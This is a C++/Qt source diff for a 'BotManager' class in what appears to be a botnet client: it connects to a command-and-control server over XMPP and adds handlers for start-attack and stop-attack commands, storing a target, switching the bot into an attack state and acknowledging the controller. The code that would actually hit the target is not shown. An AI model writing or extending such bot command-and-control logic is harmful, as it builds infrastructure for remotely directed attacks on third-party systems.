@@ -5,7 +5,11 @@
 #include "storagemanager.h"
 #include "getstatuscommand.h"
 #include "getbotstatecommand.h"
+#include "startattackcommand.h"
+#include "stopattackcommand.h"
 #include "botstateresponse.h"
+#include "attackstartedresponse.h"
+#include "attackstoppedresponse.h"
 #include <QNetworkAccessManager>
 #include <QNetworkRequest>
 #include <QNetworkReply>
@@ -35,17 +39,34 @@ void BotManager::disconnectFromCC()
     _xmppClient -> disconnectFromServer();
 }
 
+void BotManager::readyOnXmppClient()
+{
+    _bot -> setState(WaitingForCommand);
+}
+
 void BotManager::commandReceivedOnBot(Message *command)
 {
+    Message *response = 0;
+    bool isValid = true;
+
     qDebug() << "Command received from" << command -> from();
 
     if(dynamic_cast<GetStatusCommand *>(command) ||
        dynamic_cast<GetBotStateCommand *>(command)) {
-        BotStateResponse *response = new BotStateResponse;
+        response = new BotStateResponse;
+        dynamic_cast<BotStateResponse *>(response) -> setBot(_bot);
+    } else if(StartAttackCommand *startAttackCommand = dynamic_cast<StartAttackCommand *>(command)) {
+        response = new AttackStartedResponse(command -> id());
+        _target = startAttackCommand -> target();
+        _bot -> setState(AttackInProgress);
+    } else if(dynamic_cast<StopAttackCommand *>(command)) {
+        response = new AttackStoppedResponse(command -> id());
+        _bot -> setState(WaitingForCommand);
+    } else
+        isValid = false;
 
+    if(isValid) {
         response -> setTo(command -> from());
-        response -> setBot(_bot);
-
         _xmppClient -> sendResponse(*response);
     }
 
@@ -71,6 +92,8 @@ BotManager::BotManager()
 
     _bot = new Bot;
 
+    _target = "";
+
     _networkAccessManager = new QNetworkAccessManager(this);
 
     createConnections();
@@ -89,6 +112,8 @@ BotManager::~BotManager()
 
 void BotManager::createConnections()
 {
+    connect(_xmppClient, SIGNAL(ready()),
+            this, SLOT(readyOnXmppClient()));
     connect(_xmppClient, SIGNAL(commandReceived(Message *)),
             this, SLOT(commandReceivedOnBot(Message *)));
     connect(_networkAccessManager, SIGNAL(finished(QNetworkReply *)),
@@ -121,6 +146,7 @@ void BotManager::setupBot(const QString& pubIp)
     _bot -> setId(id);
     _bot -> setIp(ip);
     _bot -> setOs(os);
+    _bot -> setState(WaitingForCC);
 
     emit ready();
 }
